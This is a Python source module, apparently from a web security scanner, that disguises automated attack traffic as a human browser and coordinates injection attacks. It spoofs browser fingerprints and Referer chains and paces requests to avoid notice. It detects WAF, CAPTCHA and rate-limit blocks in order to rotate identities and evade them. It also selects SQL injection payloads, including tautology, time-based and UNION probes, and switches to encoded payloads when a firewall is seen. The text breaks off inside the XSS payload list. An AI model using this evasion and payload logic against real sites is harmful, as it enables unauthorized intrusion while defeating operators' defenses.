# -*- coding: utf-8 -*-
"""
websecure.core.human_adapter
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Human-like behavior adapter for web security scanning.

Transforms mechanical, pattern-predictable scans into sessions that
look indistinguishable from a skilled human penetration tester:

* Timing: think-time pauses, reading delays, non-uniform intervals
* Navigation: realistic browser fingerprints, referrer chains
* Adaptation: learns from responses, changes approach on detection
* Session: cookie management, token refresh, session continuity
* Retry: human-like retry logic (not exponential backoff bots)

Architecture (SOLID):
* SRP  : Each component handles one behavioral aspect.
* OCP  : New behavior patterns added via BehaviorProfile subclass.
* DIP  : HumanLikeAdapter depends on RequestAdapter abstraction.
"""
from __future__ import annotations

import logging
import random
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

_logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# TimingProfile — Configures human-like request pacing
# ---------------------------------------------------------------------------


@dataclass
class TimingProfile:
    """Timing configuration mimicking human interaction patterns."""

    think_time_min: float = 0.5      # min seconds between requests
    think_time_max: float = 3.0      # max seconds between requests
    reading_time_min: float = 1.0    # after getting large responses
    reading_time_max: float = 5.0    # after getting large responses
    burst_probability: float = 0.15  # chance of rapid consecutive requests
    burst_count_range: Tuple[int, int] = (2, 5)
    fatigue_factor: float = 0.0      # increases over time (humans get slower)
    night_mode: bool = False         # longer pauses simulating distraction

    def get_think_time(self, request_count: int = 0) -> float:
        """
        Calculate a realistic think time accounting for fatigue and night mode.

        As request_count grows the fatigue_factor linearly scales up delays,
        simulating a real researcher who slows down during a long session.
        """
        base = random.uniform(self.think_time_min, self.think_time_max)
        fatigue_bonus = self.fatigue_factor * (request_count / 100.0)

        if self.night_mode:
            # Night mode: sporadic distraction bursts (15% chance of 10-30s pause)
            if random.random() < 0.15:
                base += random.uniform(10.0, 30.0)
            else:
                base *= 1.5  # baseline slows down

        return max(0.1, base + fatigue_bonus)

    def get_reading_time(self, content_length: int) -> float:
        """
        Calculate time proportional to content length (humans read, not just download).

        Assumes ~200 WPM reading speed, 5 chars per word.
        Content over 50 KB triggers cap to avoid extreme delays.
        """
        chars_per_second = (200 * 5) / 60  # ~16.7 chars/sec
        estimated = min(content_length, 50_000) / chars_per_second
        return max(
            self.reading_time_min,
            min(self.reading_time_max, estimated * random.uniform(0.05, 0.15)),
        )


# ---------------------------------------------------------------------------
# BrowserProfile — Realistic browser fingerprints
# ---------------------------------------------------------------------------


@dataclass
class BrowserProfile:
    """A single browser fingerprint including all major identity headers."""

    name: str
    user_agent: str
    accept: str
    accept_language: str
    accept_encoding: str
    sec_ch_ua: str
    sec_ch_ua_mobile: str
    sec_ch_ua_platform: str
    sec_fetch_dest: str = "document"
    sec_fetch_mode: str = "navigate"
    sec_fetch_site: str = "none"
    sec_fetch_user: str = "?1"
    connection: str = "keep-alive"
    upgrade_insecure_requests: str = "1"

    def as_headers(self) -> Dict[str, str]:
        """Return a complete headers dict ready for injection."""
        return {
            "User-Agent": self.user_agent,
            "Accept": self.accept,
            "Accept-Language": self.accept_language,
            "Accept-Encoding": self.accept_encoding,
            "Sec-CH-UA": self.sec_ch_ua,
            "Sec-CH-UA-Mobile": self.sec_ch_ua_mobile,
            "Sec-CH-UA-Platform": self.sec_ch_ua_platform,
            "Sec-Fetch-Dest": self.sec_fetch_dest,
            "Sec-Fetch-Mode": self.sec_fetch_mode,
            "Sec-Fetch-Site": self.sec_fetch_site,
            "Sec-Fetch-User": self.sec_fetch_user,
            "Connection": self.connection,
            "Upgrade-Insecure-Requests": self.upgrade_insecure_requests,
        }


# Pre-defined realistic browser fingerprints
BROWSER_PROFILES: List[BrowserProfile] = [
    BrowserProfile(
        name="Chrome 120 Windows",
        user_agent=(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
        ),
        accept="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        accept_language="en-US,en;q=0.9",
        accept_encoding="gzip, deflate, br",
        sec_ch_ua='"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        sec_ch_ua_mobile="?0",
        sec_ch_ua_platform='"Windows"',
    ),
    BrowserProfile(
        name="Chrome 120 Mac",
        user_agent=(
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
        ),
        accept="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        accept_language="en-US,en;q=0.9",
        accept_encoding="gzip, deflate, br",
        sec_ch_ua='"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        sec_ch_ua_mobile="?0",
        sec_ch_ua_platform='"macOS"',
    ),
    BrowserProfile(
        name="Firefox 121 Linux",
        user_agent=(
            "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) "
            "Gecko/20100101 Firefox/121.0"
        ),
        accept="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        accept_language="en-US,en;q=0.5",
        accept_encoding="gzip, deflate, br",
        sec_ch_ua="",
        sec_ch_ua_mobile="?0",
        sec_ch_ua_platform='"Linux"',
        sec_fetch_dest="document",
        sec_fetch_mode="navigate",
        sec_fetch_site="none",
        sec_fetch_user="?1",
    ),
    BrowserProfile(
        name="Safari 17 Mac",
        user_agent=(
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
            "Version/17.2 Safari/605.1.15"
        ),
        accept="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        accept_language="en-US,en;q=0.9",
        accept_encoding="gzip, deflate, br",
        sec_ch_ua="",
        sec_ch_ua_mobile="?0",
        sec_ch_ua_platform='"macOS"',
    ),
    BrowserProfile(
        name="Edge 120 Windows",
        user_agent=(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
        ),
        accept="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        accept_language="en-US,en;q=0.9",
        accept_encoding="gzip, deflate, br",
        sec_ch_ua='"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
        sec_ch_ua_mobile="?0",
        sec_ch_ua_platform='"Windows"',
    ),
    BrowserProfile(
        name="Chrome 119 Android",
        user_agent=(
            "Mozilla/5.0 (Linux; Android 10; K) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/119.0.0.0 Mobile Safari/537.36"
        ),
        accept="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        accept_language="en-US,en;q=0.9",
        accept_encoding="gzip, deflate, br",
        sec_ch_ua='"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        sec_ch_ua_mobile="?1",
        sec_ch_ua_platform='"Android"',
    ),
    BrowserProfile(
        name="Firefox 121 Windows",
        user_agent=(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) "
            "Gecko/20100101 Firefox/121.0"
        ),
        accept="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        accept_language="en-US,en;q=0.5",
        accept_encoding="gzip, deflate, br",
        sec_ch_ua="",
        sec_ch_ua_mobile="?0",
        sec_ch_ua_platform='"Windows"',
    ),
    BrowserProfile(
        name="Chrome Mobile iOS",
        user_agent=(
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) "
            "AppleWebKit/605.1.15 (KHTML, like Gecko) "
            "CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1"
        ),
        accept="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        accept_language="en-US,en;q=0.9",
        accept_encoding="gzip, deflate, br",
        sec_ch_ua='"Chromium";v="120", "Not?A_Brand";v="24"',
        sec_ch_ua_mobile="?1",
        sec_ch_ua_platform='"iOS"',
    ),
]

# Profile lookup by name
_PROFILE_BY_NAME: Dict[str, BrowserProfile] = {p.name: p for p in BROWSER_PROFILES}


# ---------------------------------------------------------------------------
# BehaviorProfile — Abstract base for named behavior presets
# ---------------------------------------------------------------------------


class BehaviorProfile(ABC):
    """
    Abstract base class for named behavioral preset strategies.

    Each subclass encapsulates a distinct persona (casual user, aggressive
    scanner, stealthy researcher, paranoid tester) defined by its timing
    profile and default browser selection logic.
    """

    @property
    @abstractmethod
    def timing(self) -> TimingProfile:
        """Return the TimingProfile associated with this behavior."""

    @property
    @abstractmethod
    def preferred_browser_names(self) -> List[str]:
        """Return an ordered list of preferred BrowserProfile names."""

    def pick_browser(self) -> BrowserProfile:
        """Pick a browser profile, preferring those in the preferred list."""
        preferred = [
            BROWSER_PROFILES[i]
            for i, bp in enumerate(BROWSER_PROFILES)
            if bp.name in self.preferred_browser_names
        ]
        pool = preferred if preferred else BROWSER_PROFILES
        return random.choice(pool)


class CasualProfile(BehaviorProfile):
    """Default casual browser — moderate speed, desktop Chrome/Firefox."""

    @property
    def timing(self) -> TimingProfile:
        return TimingProfile(
            think_time_min=0.5, think_time_max=3.0,
            reading_time_min=1.0, reading_time_max=5.0,
            burst_probability=0.15,
        )

    @property
    def preferred_browser_names(self) -> List[str]:
        return ["Chrome 120 Windows", "Firefox 121 Windows", "Edge 120 Windows"]


class AggressiveProfile(BehaviorProfile):
    """Fast-paced profile — minimal delays, no reading time."""

    @property
    def timing(self) -> TimingProfile:
        return TimingProfile(
            think_time_min=0.5, think_time_max=1.5,
            reading_time_min=0.3, reading_time_max=0.8,
            burst_probability=0.35,
        )

    @property
    def preferred_browser_names(self) -> List[str]:
        return ["Chrome 120 Windows", "Chrome 120 Mac"]


class StealthProfile(BehaviorProfile):
    """Slow, deliberate profile — mimics careful manual review."""

    @property
    def timing(self) -> TimingProfile:
        return TimingProfile(
            think_time_min=2.0, think_time_max=8.0,
            reading_time_min=2.0, reading_time_max=10.0,
            burst_probability=0.05,
            fatigue_factor=0.5,
        )

    @property
    def preferred_browser_names(self) -> List[str]:
        return ["Firefox 121 Linux", "Safari 17 Mac", "Firefox 121 Windows"]


class ParanoidProfile(BehaviorProfile):
    """Extreme slow mode — maximum stealth, very long delays."""

    @property
    def timing(self) -> TimingProfile:
        return TimingProfile(
            think_time_min=5.0, think_time_max=20.0,
            reading_time_min=3.0, reading_time_max=15.0,
            burst_probability=0.0,
            fatigue_factor=1.0,
            night_mode=True,
        )

    @property
    def preferred_browser_names(self) -> List[str]:
        return ["Firefox 121 Linux", "Safari 17 Mac"]


_PROFILE_MAP: Dict[str, BehaviorProfile] = {
    "casual": CasualProfile(),
    "aggressive": AggressiveProfile(),
    "stealth": StealthProfile(),
    "paranoid": ParanoidProfile(),
}


# ---------------------------------------------------------------------------
# RequestContextTracker — Session navigation history / Referer generation
# ---------------------------------------------------------------------------


class RequestContextTracker:
    """
    Tracks the 'story' of the session (visited pages, found endpoints).

    Generates realistic Referer headers based on navigation history.
    Simulates tab management — sometimes no Referer (new tab open).
    """

    _NEW_TAB_PROBABILITY = 0.12  # 12% of requests arrive from a new tab

    def __init__(self) -> None:
        self._visited: List[str] = []
        self._start_time: float = time.time()
        self._request_count: int = 0

    def record_visit(self, url: str) -> None:
        """Record a visited URL into the history stack."""
        self._visited.append(url)
        self._request_count += 1
        if len(self._visited) > 50:
            self._visited.pop(0)

    def get_referer(self, current_url: str) -> str:
        """
        Generate a realistic Referer header for the given URL.

        Returns:
            Referer URL string, or empty string (new tab / no referrer scenario).
        """
        if not self._visited:
            return ""

        if random.random() < self._NEW_TAB_PROBABILITY:
            # Human opened a new tab — no Referer
            return ""

        # Pick the most recent page that has the same origin as current_url
        current_origin = self._get_origin(current_url)
        same_origin = [u for u in reversed(self._visited) if self._get_origin(u) == current_origin]

        if same_origin:
            return same_origin[0]

        # Cross-origin: use last visited page
        return self._visited[-1]

    def get_session_age(self) -> float:
        """Return the number of seconds since the session started."""
        return time.time() - self._start_time

    def get_request_count(self) -> int:
        """Return the total number of requests recorded."""
        return self._request_count

    @staticmethod
    def _get_origin(url: str) -> str:
        """Extract origin (scheme + host) from URL."""
        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                return ""
            return f"{parsed.scheme}://{parsed.netloc}"
        except Exception:
            return ""


# ---------------------------------------------------------------------------
# AdaptiveRateLimiter — Learns from response codes and adapts delays
# ---------------------------------------------------------------------------


class AdaptiveRateLimiter:
    """
    Monitors response codes and adapts request pacing dynamically.

    Behavior:
    - 429 Too Many Requests -> back off with realistic random delay (10-60s)
    - 503 Service Unavailable -> shorter pause (5-15s)
    - Fast server responses -> can speed up slightly over time
    - Tracks state per-domain for independent rate control
    """

    def __init__(self) -> None:
        self._domain_delays: Dict[str, float] = {}      # extra delay per domain
        self._domain_req_times: Dict[str, List[float]] = {}  # recent response times
        self._cooldown_until: Dict[str, float] = {}     # domain -> cooldown expiry

    def before_request(self, url: str) -> None:
        """
        Apply any necessary delay before making a request to this URL.

        Blocks the calling thread for the calculated duration.
        """
        domain = self._extract_domain(url)
        now = time.time()

        # Honour active cooldown
        cooldown_until = self._cooldown_until.get(domain, 0.0)
        if cooldown_until > now:
            wait = cooldown_until - now
            _logger.debug(f"[RateLimiter] Cooldown active for {domain}: sleeping {wait:.1f}s")
            time.sleep(wait)
            return

        extra = self._domain_delays.get(domain, 0.0)
        if extra > 0.01:
            _logger.debug(f"[RateLimiter] Domain {domain}: extra delay {extra:.2f}s")
            time.sleep(extra)

    def after_request(self, url: str, status_code: int, response_time: float) -> None:
        """
        Learn from a completed request and update rate-limiting state.

        Args:
            url:           The URL that was requested.
            status_code:   HTTP response status code.
            response_time: Elapsed seconds for the request.
        """
        domain = self._extract_domain(url)

        if status_code == 429:
            # Back off aggressively — random delay between 10 and 60 seconds
            delay = random.uniform(10.0, 60.0)
            self._cooldown_until[domain] = time.time() + delay
            _logger.warning(f"[RateLimiter] 429 from {domain}: backing off {delay:.1f}s")

        elif status_code == 503:
            delay = random.uniform(5.0, 15.0)
            self._cooldown_until[domain] = time.time() + delay
            _logger.warning(f"[RateLimiter] 503 from {domain}: pausing {delay:.1f}s")

        elif status_code in (200, 301, 302, 304):
            # Track recent response times; if server is fast, reduce extra delay
            times = self._domain_req_times.setdefault(domain, [])
            times.append(response_time)
            if len(times) > 10:
                times.pop(0)
            avg = sum(times) / len(times)
            if avg < 0.3 and self._domain_delays.get(domain, 0.0) > 0.0:
                # Server responds quickly — reduce self-imposed extra delay
                self._domain_delays[domain] = max(0.0, self._domain_delays[domain] - 0.05)

    @staticmethod
    def _extract_domain(url: str) -> str:
        """Extract the netloc (domain:port) from a URL."""
        try:
            return urlparse(url).netloc or url
        except Exception:
            return url


# ---------------------------------------------------------------------------
# DetectionEvader — WAF/IDS detection and evasion
# ---------------------------------------------------------------------------


class DetectionEvader:
    """
    Detects when a WAF/IDS appears to be triggered and reacts by
    switching browser profiles and entering cool-down mode.

    Detection signals:
    - Sudden 403 spike
    - Challenge / CAPTCHA pages
    - WAF block pages (Cloudflare, Imperva, Akamai, etc.)
    - Rate-limit headers
    """

    _WAF_SIGNATURES = [
        # Cloudflare
        "cloudflare", "cf-ray", "attention required",
        # Imperva / Incapsula
        "incapsula", "imperva", "_imp_apg_r_",
        # Akamai
        "akamai", "reference #",
        # ModSecurity
        "mod_security", "modsecurity", "406 not acceptable",
        # Generic WAF blocks
        "access denied", "forbidden", "blocked", "security check",
        "request blocked", "your ip", "unusual traffic",
    ]

    _CAPTCHA_SIGNATURES = [
        "captcha", "recaptcha", "hcaptcha", "i am not a robot",
        "are you a robot", "verify you are human", "human verification",
    ]

    _RATE_LIMIT_HEADERS = [
        "x-ratelimit-remaining", "retry-after", "x-rate-limit",
        "ratelimit-remaining", "x-envoy-ratelimited",
    ]

    def __init__(self) -> None:
        self._detection_count: int = 0
        self._cooldown_until: float = 0.0
        self._current_profile_index: int = 0

    def check_response(self, response_body: str, status_code: int) -> bool:
        """
        Determine whether the response indicates WAF/IDS detection.

        Returns:
            True if detection is suspected, False otherwise.
        """
        if self._is_captcha(response_body):
            _logger.warning("[DetectionEvader] CAPTCHA detected")
            return True
        if self._is_waf_block(response_body, status_code):
            _logger.warning(f"[DetectionEvader] WAF block detected (status={status_code})")
            return True
        return False

    def react_to_detection(self) -> None:
        """
        Update browser profile and timing after detecting evasion failure.

        Rotates to the next browser profile and sets a random cooldown.
        """
        self._detection_count += 1
        self._current_profile_index = (self._current_profile_index + 1) % len(BROWSER_PROFILES)
        cooldown = random.uniform(15.0, 90.0)
        self._cooldown_until = time.time() + cooldown
        _logger.info(
            f"[DetectionEvader] Reacting to detection #{self._detection_count}: "
            f"new profile='{BROWSER_PROFILES[self._current_profile_index].name}', "
            f"cooldown={cooldown:.0f}s"
        )
        time.sleep(cooldown)

    def get_current_profile(self) -> BrowserProfile:
        """Return the currently active BrowserProfile."""
        return BROWSER_PROFILES[self._current_profile_index]

    def is_in_cooldown(self) -> bool:
        """Return True if currently in a detection-triggered cooldown."""
        return time.time() < self._cooldown_until

    def _is_captcha(self, body: str) -> bool:
        """Return True if the response body contains captcha indicators."""
        body_lower = body.lower()
        return any(sig in body_lower for sig in self._CAPTCHA_SIGNATURES)

    def _is_waf_block(self, body: str, status: int) -> bool:
        """Return True if response body or status indicates a WAF block."""
        if status in (403, 406, 429, 503):
            body_lower = body.lower()
            return any(sig in body_lower for sig in self._WAF_SIGNATURES)
        return False

    def _is_rate_limited(self, status: int, headers: Dict[str, str]) -> bool:
        """Return True if response headers signal rate limiting."""
        if status == 429:
            return True
        headers_lower = {k.lower(): v for k, v in headers.items()}
        return any(h in headers_lower for h in self._RATE_LIMIT_HEADERS)


# ---------------------------------------------------------------------------
# HumanLikeAdapter — Main adapter wrapping requests.Session
# ---------------------------------------------------------------------------


class HumanLikeAdapter:
    """
    Wraps any requests.Session to add human-like behavior.

    Usage:
        session = requests.Session()
        adapter = HumanLikeAdapter(session, profile="stealth")
        # Now use adapter.get/post instead of session.get/post
        resp = adapter.get("https://target.com/page")

    Profiles:
        "casual"     - moderate speed, desktop browser (default)
        "aggressive" - fast scanning, minimal delays
        "stealth"    - slow, very human-like, low detection risk
        "paranoid"   - extreme stealth with night-mode delays
    """

    def __init__(
        self,
        session: Any,
        profile: str = "stealth",
        browser_profile: Optional[BrowserProfile] = None,
    ) -> None:
        """
        Initialize the adapter.

        Args:
            session:         A requests.Session (or compatible) instance.
            profile:         Named behavior preset: casual/aggressive/stealth/paranoid.
            browser_profile: Optional fixed BrowserProfile override. If None, the
                             behavior profile selects one automatically.
        """
        self._session = session
        self._behavior: BehaviorProfile = _PROFILE_MAP.get(profile, _PROFILE_MAP["stealth"])
        self._browser: BrowserProfile = browser_profile or self._behavior.pick_browser()
        self._context = RequestContextTracker()
        self._rate_limiter = AdaptiveRateLimiter()
        self._evader = DetectionEvader()
        self._detection_events: int = 0
        self._request_count: int = 0
        self._total_sleep_time: float = 0.0
        self._start_time: float = time.time()
        self._base_url: Optional[str] = None

        _logger.debug(
            f"[HumanLikeAdapter] Initialized: profile={profile}, "
            f"browser='{self._browser.name}'"
        )

    def get(self, url: str, **kwargs: Any) -> Any:
        """
        Perform a human-like GET request.

        Applies browser fingerprint headers, realistic timing delays,
        referrer chain, and WAF detection/evasion before and after
        the actual request.
        """
        return self._make_request("GET", url, **kwargs)

    def post(self, url: str, **kwargs: Any) -> Any:
        """
        Perform a human-like POST request.

        Same behavioral logic as GET but with POST method.
        """
        return self._make_request("POST", url, **kwargs)

    def _make_request(self, method: str, url: str, **kwargs: Any) -> Any:
        """
        Internal dispatcher — applies all human-like behaviors around the request.

        Order:
        1. Pre-request warm-up (occasional homepage visit)
        2. Apply human headers
        3. Rate-limiter delay
        4. Think-time sleep
        5. Execute request
        6. Post-request: update rate limiter, detect WAF, simulate reading
        """
        self._maybe_warm_up(url)
        kwargs = self._apply_human_headers(kwargs, url)
        self._rate_limiter.before_request(url)
        self._human_sleep()

        t0 = time.time()
        try:
            response = self._session.request(method, url, **kwargs)
        except Exception as exc:
            _logger.debug(f"[HumanLikeAdapter] Request error: {exc!r}")
            raise

        response_time = time.time() - t0
        self._request_count += 1
        self._context.record_visit(url)
        self._rate_limiter.after_request(url, response.status_code, response_time)

        # WAF / detection check
        try:
            body_preview = response.text[:4096]
        except Exception:
            body_preview = ""

        resp_headers = dict(getattr(response, "headers", {}) or {})
        if self._evader._is_rate_limited(response.status_code, resp_headers):
            _logger.debug(f"[HumanLikeAdapter] Rate-limit detected for {url}, applying backoff.")
            self._rate_limiter.before_request(url)

        if self._evader.check_response(body_preview, response.status_code):
            self._handle_detection(response)

        # Simulate reading the content
        try:
            content_length = len(response.content)
        except Exception:
            content_length = 0
        self._simulate_reading(content_length)

        return response

    def _apply_human_headers(self, kwargs: Dict[str, Any], url: str) -> Dict[str, Any]:
        """
        Inject realistic browser headers and Referer into the request kwargs.

        Existing headers are merged, not replaced.
        """
        browser_headers = self._browser.as_headers()
        referer = self._context.get_referer(url)
        if referer:
            browser_headers["Referer"] = referer

        existing_headers = kwargs.get("headers", {}) or {}
        merged = {**browser_headers, **existing_headers}
        kwargs["headers"] = merged
        return kwargs

    def _human_sleep(self, response_size: int = 0) -> None:
        """
        Apply a realistic inter-request delay.

        When a burst is triggered the delay is minimal (0.05-0.2s);
        otherwise the timing profile's think_time is used with jitter.
        """
        timing = self._behavior.timing
        if random.random() < timing.burst_probability:
            # Burst mode: rapid consecutive requests like typing in a URL
            delay = random.uniform(0.05, 0.2)
        else:
            delay = timing.get_think_time(self._request_count)

        if delay > 0.01:
            _logger.debug(f"[HumanLikeAdapter] Think-time sleep: {delay:.2f}s")
            time.sleep(delay)
            self._total_sleep_time += delay

    def _handle_detection(self, response: Any) -> None:
        """
        React to WAF/IDS detection: rotate browser profile and cool down.
        """
        self._detection_events += 1
        _logger.warning(
            f"[HumanLikeAdapter] Detection event #{self._detection_events} — "
            f"rotating profile and cooling down."
        )
        self.rotate_browser_profile()
        self._evader.react_to_detection()

    def _maybe_warm_up(self, url: str) -> None:
        """
        Occasionally visit the homepage first, mimicking a real user
        who navigates to a site from a fresh tab rather than directly
        hitting a deep URL.

        Probability: 8% for first 5 requests, 0% thereafter.
        """
        if self._request_count >= 5:
            return
        if random.random() > 0.08:
            return

        try:
            parsed = urlparse(url)
            homepage = f"{parsed.scheme}://{parsed.netloc}/"
            if homepage != url and self._context.get_request_count() == 0:
                _logger.debug(f"[HumanLikeAdapter] Warm-up: visiting homepage {homepage}")
                self._session.get(
                    homepage,
                    headers=self._browser.as_headers(),
                    timeout=10,
                )
                self._context.record_visit(homepage)
                time.sleep(random.uniform(0.5, 2.0))
        except Exception as _fix_e:
            _logger.debug(f"[core.human_adapter] {type(_fix_e).__name__}: {_fix_e!r}")

    def _simulate_reading(self, content_length: int) -> None:
        """
        Pause proportionally to content length, simulating a researcher
        reading the response body before issuing the next request.
        """
        if content_length < 500:
            return
        timing = self._behavior.timing
        read_time = timing.get_reading_time(content_length)
        if read_time > 0.1:
            _logger.debug(f"[HumanLikeAdapter] Reading simulation: {read_time:.2f}s")
            time.sleep(read_time)
            self._total_sleep_time += read_time

    def rotate_browser_profile(self) -> None:
        """Switch to a randomly selected browser profile different from current."""
        candidates = [bp for bp in BROWSER_PROFILES if bp.name != self._browser.name]
        if candidates:
            self._browser = random.choice(candidates)
            _logger.info(f"[HumanLikeAdapter] Rotated to browser: '{self._browser.name}'")

    def get_stats(self) -> Dict[str, Any]:
        """
        Return operational statistics for monitoring and reporting.

        Returns:
            Dict with request_count, detection_events, total_sleep_time,
            session_age_seconds, current_browser, and request_rate.
        """
        age = time.time() - self._start_time
        return {
            "request_count": self._request_count,
            "detection_events": self._detection_events,
            "total_sleep_time_s": round(self._total_sleep_time, 2),
            "session_age_s": round(age, 2),
            "current_browser": self._browser.name,
            "request_rate_per_min": round((self._request_count / max(age, 1)) * 60, 2),
            "context_visits": self._context.get_request_count(),
        }


# ---------------------------------------------------------------------------
# AdaptiveAttackEngine — High-level attack coordinator
# ---------------------------------------------------------------------------


class AdaptiveAttackEngine:
    """
    High-level attack coordinator with human-like intelligence.

    Maintains attack state across multiple requests to the same target.
    Makes strategic decisions like a human tester:
    - If a parameter is blocked, try a different approach
    - If WAF detected, switch to encoded payloads
    - If rate limited, switch target endpoint
    - If 404 received, try related paths
    """

    # Consecutive failure threshold before giving up on a target+approach
    MAX_CONSECUTIVE_FAILURES = 5

    # Concurrency adjustment bounds
    MIN_THREADS = 1
    MAX_THREADS = 20

    def __init__(self) -> None:
        self.attack_state: Dict[str, Any] = {}
        self._successes: List[Dict[str, Any]] = []
        self._failures: List[Dict[str, Any]] = []

    def select_next_payload(
        self,
        target: str,
        param: str,
        tried_payloads: List[str],
        last_response: Optional[str],
    ) -> str:
        """
        Select the next payload to try based on prior attempts and server response.

        Strategy:
        1. If WAF detected in last response -> use encoded/obfuscated variant
        2. If 404/empty response -> basic probe
        3. Otherwise -> pick from un-tried payloads in the payload bank

        Args:
            target:          Target URL.
            param:           Parameter being tested.
            tried_payloads:  List of payloads already attempted.
            last_response:   Response body of the last request (for adaptation).

        Returns:
            Next payload string to inject.
        """
        state = self.attack_state.setdefault(target, {})
        vuln_type = state.get("vuln_type", "generic")

        # Detect if WAF is active from response
        if last_response and any(
            sig in last_response.lower()
            for sig in ("blocked", "forbidden", "access denied", "waf", "firewall")
        ):
            return self._get_encoded_payload(vuln_type, tried_payloads)

        # Standard payload selection — avoid repeats
        bank = self._get_payload_bank(vuln_type)
        untried = [p for p in bank if p not in tried_payloads]
        if untried:
            return random.choice(untried)

        # Fall back to a random mutation of any payload
        if bank:
            base = random.choice(bank)
            return self._mutate_payload(base)

        return "' OR '1'='1"

    def should_continue(self, target: str, consecutive_failures: int) -> bool:
        """
        Decide whether to continue attacking a target.

        Returns False when consecutive failures exceed the threshold or
        the target has been marked as successfully exploited (no need to
        continue).

        Args:
            target:               Target URL.
            consecutive_failures: Number of back-to-back failures.
        """
        if consecutive_failures >= self.MAX_CONSECUTIVE_FAILURES:
            _logger.info(
                f"[AdaptiveAttackEngine] Abandoning {target}: "
                f"{consecutive_failures} consecutive failures."
            )
            return False

        state = self.attack_state.get(target, {})
        if state.get("exploited"):
            _logger.info(f"[AdaptiveAttackEngine] Target {target} already exploited.")
            return False

        return True

    def get_alternative_approach(self, vuln_type: str, current_approach: str) -> str:
        """
        Suggest an alternative attack approach when the current one is blocked.

        Args:
            vuln_type:        Vulnerability type (e.g. "sqli", "xss", "lfi").
            current_approach: Label of the current technique being used.

        Returns:
            Label of the recommended alternative approach.
        """
        alternatives: Dict[str, List[str]] = {
            "sqli": ["union_based", "boolean_blind", "time_based", "error_based", "stacked"],
            "xss":  ["reflected", "stored", "dom", "polyglot", "encoded"],
            "lfi":  ["path_traversal", "null_byte", "php_filter", "double_encode", "log_poison"],
            "ssrf": ["cloud_metadata", "internal_scan", "gopher", "file_proto", "dict_proto"],
            "ssti": ["jinja2", "twig", "freemarker", "velocity", "smarty"],
        }
        options = alternatives.get(vuln_type, ["basic", "encoded", "obfuscated"])
        remaining = [a for a in options if a != current_approach]
        return random.choice(remaining) if remaining else "encoded"

    def record_success(self, target: str, payload: str, vuln_type: str) -> None:
        """
        Record a successful exploitation attempt.

        Marks the target as exploited so the engine can avoid redundant work.
        """
        state = self.attack_state.setdefault(target, {})
        state["exploited"] = True
        state["vuln_type"] = vuln_type
        self._successes.append({
            "target": target,
            "payload": payload,
            "vuln_type": vuln_type,
            "timestamp": time.time(),
        })
        _logger.info(
            f"[AdaptiveAttackEngine] SUCCESS on {target} | "
            f"type={vuln_type} | payload={payload[:60]!r}"
        )

    def record_failure(self, target: str, payload: str, reason: str) -> None:
        """
        Record a failed exploitation attempt.

        Args:
            target:  Target URL.
            payload: The payload that failed.
            reason:  Short reason string (e.g. "waf_block", "no_reflection", "timeout").
        """
        self._failures.append({
            "target": target,
            "payload": payload,
            "reason": reason,
            "timestamp": time.time(),
        })
        _logger.debug(
            f"[AdaptiveAttackEngine] FAILURE on {target} | reason={reason} | "
            f"payload={payload[:40]!r}"
        )

    def adapt_concurrency(self, current_threads: int, error_rate: float) -> int:
        """
        Dynamically adjust the thread count based on the observed error rate.

        Scaling logic:
        - error_rate > 0.5 (50%+): cut threads in half
        - error_rate > 0.25:       reduce by one thread
        - error_rate < 0.05:       increase by one thread (if room)

        Args:
            current_threads: Current thread pool size.
            error_rate:      Fraction of recent requests that errored (0.0-1.0).

        Returns:
            Recommended new thread count.
        """
        if error_rate > 0.5:
            new = max(self.MIN_THREADS, current_threads // 2)
        elif error_rate > 0.25:
            new = max(self.MIN_THREADS, current_threads - 1)
        elif error_rate < 0.05:
            new = min(self.MAX_THREADS, current_threads + 1)
        else:
            new = current_threads

        if new != current_threads:
            _logger.info(
                f"[AdaptiveAttackEngine] Concurrency adapted: "
                f"{current_threads} -> {new} (error_rate={error_rate:.2%})"
            )
        return new

    # -- Internal helpers ---------------------------------------------------

    @staticmethod
    def _get_payload_bank(vuln_type: str) -> List[str]:
        """Return a standard payload list for the given vulnerability type."""
        banks: Dict[str, List[str]] = {
            "sqli": [
                "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
                "') OR ('1'='1", "1 AND SLEEP(5)--", "1' AND 1=1--",
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
                "1 ORDER BY 1--", "1 GROUP BY 1--",
            ],
            "xss": [
